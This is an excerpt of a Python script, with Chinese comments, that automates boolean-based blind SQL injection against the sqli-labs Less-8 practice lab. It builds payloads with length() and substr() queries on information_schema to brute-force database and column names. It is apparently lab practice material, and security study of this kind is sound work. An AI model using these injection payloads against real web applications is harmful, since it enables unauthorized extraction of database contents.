...
def bihe_method(): #判断闭合方式
    ...
    for i in range(len(new_bihe_list)):
        ...
        str1 = "You are in"
        if (str1 in r2.text) and (str1 in r3.text) and (str1 in r4.text):
            p = new_bihe_list[i]
...
def db_length(url, str):
    bihe_real = bihe_method()
    print("[-]开始测试数据库名长度......")
    flag = True
    for i in range(len(bihe_real)):
        for j in range(2,40):
            db_payload = url + bihe_real[i] + " and (select length(database())=%d) --+" % j
            # print(db_payload)
            r = requests.get(db_payload)
            str1 = "You are in"
            if str in r.text:
...
def column_name(table_name, column_num, db_name):
    ...
    for i in range(int(column_num)):  # i表示每张表的字段数量
        ...
        for j in range(1, 21):  # 爆破字段的长度
            column_name_length = url1 + " and %d=(select length(column_name) from information_schema.columns where table_name='%s' limit %d,1)--+" % (j - 1, table_name, i)
            r = requests.get(column_name_length)
            if str in r.text:
                column_length.append(j)
                break
            for k in str_list:  # 爆破字段名
                column_payload = url1 + ' and ((select substr((select column_name from information_schema.columns where table_name="%s" and table_schema="%s" limit %d,1),%d,1))="%s") --+' % (table_name, db_name, i, j, k)
                r = requests.get(column_payload)
                if str in r.text:
                    column_name += k
                    break
...
if __name__ == '__main__':
    ...
    url = "http://192.168.6.149/sql-labs/Less-8/?id=1"  # 目标url
